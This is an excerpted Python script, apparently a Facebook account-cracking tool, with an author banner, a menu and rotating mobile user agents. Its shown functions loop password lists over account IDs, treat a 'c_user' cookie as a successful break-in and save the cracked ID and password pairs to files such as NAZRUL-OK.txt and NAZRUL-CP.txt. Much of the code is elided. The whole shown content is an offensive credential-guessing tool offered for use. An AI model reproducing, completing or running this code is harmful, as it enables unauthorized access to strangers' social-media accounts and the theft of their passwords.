...
ugen2=['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
...
$$ |\$$$ |$$ |  $$ | $$  /    $$ |  $$ |$$ |  $$ |$$ |      
$$ | \$$ |$$ |  $$ |$$$$$$$$\ $$ |  $$ |\$$$$$$  |$$$$$$$$\ 
\__|  \__|\__|  \__|\________|\__|  \__| \______/ \________|m----------------------------------------------
→   Owner      :  Md. Nazrul Islam
→   Facebook   :  NAZRUL ISLAM
→   Github     :  NAZRUL-2-0
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/NAZRUL.OFFICIAL.ACCOUNT');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mNAZRUL\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[NAZRUL-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/NAZRUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
				...
				if 'y' in pcp:
					...
					open('/sdcard/NAZRUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[NAZRUL-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/NAZRUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[NAZRUL-OK] '+cid+' | '+ps+'\033[1;32m')
				open('NAZRUL-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[NAZRUL-CP] '+cid+' | '+ps+'\33[0;97m')
				open('NAZRUL-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
